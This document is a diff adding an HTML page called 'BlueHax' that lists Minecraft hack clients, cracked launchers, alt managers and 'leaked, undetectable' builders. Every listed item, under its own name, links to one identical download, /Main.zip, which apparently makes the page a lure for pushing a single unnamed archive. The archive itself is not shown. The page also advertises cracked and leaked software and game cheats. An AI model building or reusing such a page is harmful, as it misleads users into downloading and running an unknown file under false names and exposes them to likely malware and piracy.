@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>BlueHax | List of Minecraft hacks</title>
+    <style>
+        body { background: #09090b; color: #fafafa; font-family: sans-serif; padding: 40px; margin: 0; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .tabs { display: flex; gap: 10px; margin-bottom: 20px; justify-content: center; }
+        .tab-btn { background: #18181b; border: 1px solid #27272a; color: #a1a1aa; padding: 10px 20px; cursor: pointer; border-radius: 6px; }
+        .tab-btn.active { background: #3b82f6; color: white; border-color: #3b82f6; }
+        
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; margin-top: 20px; }
+        .item { background: #18181b; padding: 16px; border-radius: 8px; border: 1px solid #27272a; display: flex; justify-content: space-between; align-items: center; }
+        .get-link { color: #3b82f6; text-decoration: none; font-weight: 600; padding: 6px 12px; border: 1px solid #3b82f6; border-radius: 4px; }
+        .get-link:hover { background: #3b82f6; color: white; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>BlueHax</h1>
+    <p>Version: 0.5, Select a category</p>
+    <div id="tabs" class="tabs"></div>
+</div>
+
+<div id="content" class="grid"></div>
+
+<script>
+    // Just edit this section to add your tabs and software
+    const softwareData = {
+        "Alt Managers": ["AltXD", "Main2Alt", "Altsy"],
+        "Hacks": ["Black Client", "VIP Client (Crack)", "CHax"],
+        "Texture Packs": ["All in one pack", "Dark Mode Pack", "Bedwars Pack"],
+	"Trainers": ["Blue Trainer", "TrainXD", "MyTrainer", "Trident Trainer", "Trip Trainer"],
+	"Builders": ["MineTrain Builder", "VIP Builder (Leak, Crack, Undetectable)", "LMAO Builder", "Launchr Builder (Leak)"],
+	"Launchers": ["Launchr", "MinePremium", "FreePremium Launcher", "GGun Launcher"]
+    };
+
+    let currentTab = Object.keys(softwareData)[0];
+
+    function render() {
+        const tabsDiv = document.getElementById('tabs');
+        const contentDiv = document.getElementById('content');
+        tabsDiv.innerHTML = '';
+        contentDiv.innerHTML = '';
+
+        Object.keys(softwareData).forEach(cat => {
+            const btn = document.createElement('button');
+            btn.className = `tab-btn ${currentTab === cat ? 'active' : ''}`;
+            btn.innerText = cat;
+            btn.onclick = () => { currentTab = cat; render(); };
+            tabsDiv.appendChild(btn);
+        });
+
+        softwareData[currentTab].forEach(soft => {
+            contentDiv.innerHTML += `
+                <div class="item">
+                    <span>${soft}</span>
+                    <a href="/Main.zip" class="get-link" download="Main.zip">GET</a>
+                </div>`;
+        });
+    }
+
+    render();
+</script>
+</body>
+</html>
